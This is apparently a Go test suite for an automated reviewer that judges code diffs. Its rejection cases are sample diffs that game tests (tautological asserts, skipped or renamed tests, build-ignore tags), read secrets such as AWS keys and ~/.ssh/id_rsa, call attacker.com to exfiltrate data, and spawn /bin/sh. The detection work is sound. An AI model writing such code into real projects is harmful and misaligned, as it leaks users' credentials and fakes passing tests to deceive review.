package reviewer

import (
	"context"
	"testing"

	"artix/pkg/persona"
	"artix/pkg/sandbox"
)

func TestP0_4_ReviewerCorpus_Rejected(t *testing.T) {
	reg := persona.NewRegistry("")
	rev := NewAdversarialReviewer(reg)
	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
	})

	cases := []struct {
		name         string
		diff         string
		rulePacks    []string
		expectStatus ReviewStatus
	}{
		// 1. Kotlin tautologies & skips
		{
			name: "Kotlin assertTrue(true)",
			diff: `diff --git a/src/test/kotlin/AppTest.kt b/src/test/kotlin/AppTest.kt
--- a/src/test/kotlin/AppTest.kt
+++ b/src/test/kotlin/AppTest.kt
@@ -1,5 +1,6 @@
 class AppTest {
     @Test
     fun testFeature() {
+        assertTrue(true)
     }
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Kotlin assertEquals(a, a)",
			diff: `diff --git a/src/test/kotlin/AppTest.kt b/src/test/kotlin/AppTest.kt
--- a/src/test/kotlin/AppTest.kt
+++ b/src/test/kotlin/AppTest.kt
@@ -1,5 +1,6 @@
 class AppTest {
     @Test
     fun testFeature() {
+        assertEquals(a, a)
     }
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 2. Swift tautologies, skips, and renames
		{
			name: "Swift XCTAssertTrue(true)",
			diff: `diff --git a/Tests/AppTests.swift b/Tests/AppTests.swift
--- a/Tests/AppTests.swift
+++ b/Tests/AppTests.swift
@@ -1,5 +1,6 @@
 class AppTests: XCTestCase {
     func testFeature() {
+        XCTAssertTrue(true)
     }
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Swift XCTAssertEqual(1,1)",
			diff: `diff --git a/Tests/AppTests.swift b/Tests/AppTests.swift
--- a/Tests/AppTests.swift
+++ b/Tests/AppTests.swift
@@ -1,5 +1,6 @@
 class AppTests: XCTestCase {
     func testFeature() {
+        XCTAssertEqual(1,1)
     }
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Swift throw XCTSkip",
			diff: `diff --git a/Tests/AppTests.swift b/Tests/AppTests.swift
--- a/Tests/AppTests.swift
+++ b/Tests/AppTests.swift
@@ -1,5 +1,6 @@
 class AppTests: XCTestCase {
     func testFeature() throws {
+        throw XCTSkip("skipping test")
     }
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Swift func testFoo renamed to func foo",
			diff: `diff --git a/Tests/AppTests.swift b/Tests/AppTests.swift
--- a/Tests/AppTests.swift
+++ b/Tests/AppTests.swift
@@ -1,5 +1,5 @@
 class AppTests: XCTestCase {
-    func testFoo() {
+    func foo() {
         validate()
     }
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 3. JS expect(a).toEqual(a)
		{
			name: "JS expect(a).toEqual(a)",
			diff: `diff --git a/src/app.test.js b/src/app.test.js
--- a/src/app.test.js
+++ b/src/app.test.js
@@ -1,5 +1,6 @@
 test("feature", () => {
+    expect(a).toEqual(a);
 });
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 4. Python assert True
		{
			name: "Python assert True",
			diff: `diff --git a/tests/test_app.py b/tests/test_app.py
--- a/tests/test_app.py
+++ b/tests/test_app.py
@@ -1,4 +1,5 @@
 def test_feature():
+    assert True
     pass
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 5. Go testify require.Equal(t,2,2) and build tag ignore
		{
			name: "Go testify require.Equal(t,2,2)",
			diff: `diff --git a/pkg/app/app_test.go b/pkg/app/app_test.go
--- a/pkg/app/app_test.go
+++ b/pkg/app/app_test.go
@@ -1,5 +1,6 @@
 package app
 func TestFeature(t *testing.T) {
+    require.Equal(t,2,2)
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Go build tag ignore in test file",
			diff: `diff --git a/pkg/app/app_test.go b/pkg/app/app_test.go
--- a/pkg/app/app_test.go
+++ b/pkg/app/app_test.go
@@ -1,3 +1,4 @@
+//go:build ignore
 package app
 import "testing"
 func TestFeature(t *testing.T) {
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 6. Kotlin/Swift secret reads
		{
			name: "Kotlin secret read System.getenv",
			diff: `diff --git a/src/main/kotlin/App.kt b/src/main/kotlin/App.kt
--- a/src/main/kotlin/App.kt
+++ b/src/main/kotlin/App.kt
@@ -1,3 +1,4 @@
 class App {
+    fun getSecret(): String = System.getenv("AWS_SECRET_ACCESS_KEY")
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Kotlin secret read ~/.ssh",
			diff: `diff --git a/src/main/kotlin/App.kt b/src/main/kotlin/App.kt
--- a/src/main/kotlin/App.kt
+++ b/src/main/kotlin/App.kt
@@ -1,3 +1,5 @@
+import java.io.File
 class App {
+    fun getSSH() = File(System.getProperty("user.home") + "/.ssh/id_rsa").readText()
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Swift secret read ProcessInfo environment",
			diff: `diff --git a/Sources/App.swift b/Sources/App.swift
--- a/Sources/App.swift
+++ b/Sources/App.swift
@@ -1,3 +1,5 @@
 import Foundation
 func leakKey() {
+    let k = ProcessInfo.processInfo.environment["SECRET_TOKEN"]
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 7. Kotlin/Swift network exfil
		{
			name: "Kotlin network exfil URL.openStream",
			diff: `diff --git a/src/main/kotlin/App.kt b/src/main/kotlin/App.kt
--- a/src/main/kotlin/App.kt
+++ b/src/main/kotlin/App.kt
@@ -1,3 +1,5 @@
+import java.net.URL
 class App {
+    fun exfil() { URL("https://attacker.com/leak").openStream() }
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Swift network exfil URLSession",
			diff: `diff --git a/Sources/App.swift b/Sources/App.swift
--- a/Sources/App.swift
+++ b/Sources/App.swift
@@ -1,3 +1,6 @@
 import Foundation
 func exfil(url: URL) {
+    URLSession.shared.dataTask(with: url).resume()
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 8. Execution: posix_spawn, Package.swift plugin
		{
			name: "Swift execution posix_spawn",
			diff: `diff --git a/Sources/App.swift b/Sources/App.swift
--- a/Sources/App.swift
+++ b/Sources/App.swift
@@ -1,3 +1,6 @@
 func runProcess() {
+    var pid: pid_t = 0
+    posix_spawn(&pid, "/bin/sh", nil, nil, nil, nil)
 }
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},
		{
			name: "Swift Package.swift plugin",
			diff: `diff --git a/Package.swift b/Package.swift
--- a/Package.swift
+++ b/Package.swift
@@ -1,5 +1,7 @@
 // swift-tools-version: 5.9
 import PackageDescription
 let package = Package(
     name: "App",
+    targets: [.plugin(name: "EvilPlugin", capability: .command())]
 )
`,
			rulePacks:    []string{"taboo", "test-integrity"},
			expectStatus: StatusRejected,
		},

		// 9. Semantic runner without required rule packs (e.g. only formatting ran)
		{
			name: "Kotlin valid diff but runner only ran formatting pack",
			diff: `diff --git a/src/main/kotlin/App.kt b/src/main/kotlin/App.kt
--- a/src/main/kotlin/App.kt
+++ b/src/main/kotlin/App.kt
@@ -1,3 +1,4 @@
 class App {
+    fun add(a: Int, b: Int): Int = a + b
 }
`,
			rulePacks:    []string{"formatting"},
			expectStatus: StatusUnreviewed,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ctx := &ReviewContext{
				Ctx:                      context.Background(),
				Diff:                     tc.diff,
				SemanticRunnerConfigured: true,
				SemanticRunnerExecuted:   true,
				RulePacksRan:             tc.rulePacks,
				TestResults: []*sandbox.ExecResult{
					{Command: "test", ExitCode: 0},
				},
			}
			verdict := rev.Evaluate(ctx)
			if verdict.Approved {
				t.Fatalf("SECURITY VIOLATION: expected %s to NOT be approved (expected status %s), got approved=true with issues: %v", tc.name, tc.expectStatus, verdict.BlockingIssues)
			}
			if verdict.Status != tc.expectStatus {
				t.Fatalf("expected status %s, got %s (issues: %v)", tc.expectStatus, verdict.Status, verdict.BlockingIssues)
			}
		})
	}
}

func TestP0_4_ReviewerCorpus_Benign_Approved(t *testing.T) {
	reg := persona.NewRegistry("")
	rev := NewAdversarialReviewer(reg)
	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
	})

	cases := []struct {
		name      string
		diff      string
		rulePacks []string
	}{
		{
			name: "Benign Kotlin unit test",
			diff: `diff --git a/src/test/kotlin/AppTest.kt b/src/test/kotlin/AppTest.kt
--- a/src/test/kotlin/AppTest.kt
+++ b/src/test/kotlin/AppTest.kt
@@ -1,5 +1,7 @@
 class AppTest {
     @Test
     fun testAddition() {
+        val res = Calculator().add(2, 3)
+        assertEquals(5, res)
     }
 }
`,
			rulePacks: []string{"taboo", "test-integrity"},
		},
		{
			name: "Benign Swift unit test",
			diff: `diff --git a/Tests/AppTests.swift b/Tests/AppTests.swift
--- a/Tests/AppTests.swift
+++ b/Tests/AppTests.swift
@@ -1,5 +1,7 @@
 class AppTests: XCTestCase {
     func testSum() {
+        let result = sum(2, 3)
+        XCTAssertEqual(result, 5)
     }
 }
`,
			rulePacks: []string{"taboo", "test-integrity"},
		},
		{
			name: "Benign JS test",
			diff: `diff --git a/src/calc.test.js b/src/calc.test.js
--- a/src/calc.test.js
+++ b/src/calc.test.js
@@ -1,5 +1,7 @@
 test("adds numbers", () => {
+    const sum = add(2, 3);
+    expect(sum).toEqual(5);
 });
`,
			rulePacks: []string{"taboo", "test-integrity"},
		},
		{
			name: "Benign Python test",
			diff: `diff --git a/tests/test_calc.py b/tests/test_calc.py
--- a/tests/test_calc.py
+++ b/tests/test_calc.py
@@ -1,4 +1,6 @@
 def test_calc():
+    result = compute(10)
+    assert result == 20
 `,
			rulePacks: []string{"taboo", "test-integrity"},
		},
		{
			name: "Benign Go testify test",
			diff: `diff --git a/pkg/app/app_test.go b/pkg/app/app_test.go
--- a/pkg/app/app_test.go
+++ b/pkg/app/app_test.go
@@ -1,5 +1,7 @@
 package app
 func TestAppLogic(t *testing.T) {
+    got := RunApp()
+    require.Equal(t, 42, got)
 }
`,
			rulePacks: []string{"taboo", "test-integrity"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ctx := &ReviewContext{
				Ctx:                      context.Background(),
				Diff:                     tc.diff,
				SemanticRunnerConfigured: true,
				SemanticRunnerExecuted:   true,
				RulePacksRan:             tc.rulePacks,
				TestResults: []*sandbox.ExecResult{
					{Command: "test", ExitCode: 0},
				},
			}
			verdict := rev.Evaluate(ctx)
			if !verdict.Approved || verdict.Status != StatusApproved {
				t.Fatalf("expected benign test to be approved, got approved=%v status=%s, issues: %v", verdict.Approved, verdict.Status, verdict.BlockingIssues)
			}
		})
	}
}
